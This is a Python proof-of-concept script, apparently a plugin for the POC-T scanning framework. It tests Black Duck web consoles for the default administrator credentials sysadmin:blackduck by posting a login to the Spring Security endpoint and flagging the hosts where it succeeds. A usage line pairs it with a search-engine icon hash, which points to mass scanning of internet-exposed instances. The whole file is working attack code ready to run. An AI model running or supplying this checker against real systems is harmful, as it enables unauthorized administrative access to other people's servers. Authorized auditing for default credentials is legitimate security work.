#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = zuoxueba.org@gmail.com

"""
Black Duck system default password PoC (Web Console)

  sysadmin:blackduck

Use: 
    python POC-T.py -s BlackDuck_default-pwd.py -aF 'icon_hash="1845421917"'


Ref: https://synopsys.atlassian.net/wiki/spaces/BDLM/pages/65831179/Installing+Black+Duck+using+Synopsysctl
"""

import requests

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def poc(url):
    url = 'https://' + url if '://' not in url else url

    burp0_url = "%s/j_spring_security_check" % url
    burp0_headers = {
        "Sec-Ch-Ua": "\" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\",\"Chromium\";v=\"91\"",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome92.1.4412.87 Safari/537.99",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": url,
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US",
        "Connection": "close"}
    burp0_data = {"j_username": "sysadmin",
                  "j_password": "blackduck"}
    try:
        r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, timeout=8, verify=False)
        if (r.status_code == 401) and ("unauthenticated" in r.text):
            pass
        elif (r.status_code == 204) and ("AUTHORIZATION_BEARER" in r.headers["Set-Cookie"]):
            print("\n[%s]%s" % (r.status_code, url))
            return url
    except Exception as e:
        # print("[!]error(%s)" % e)
        pass
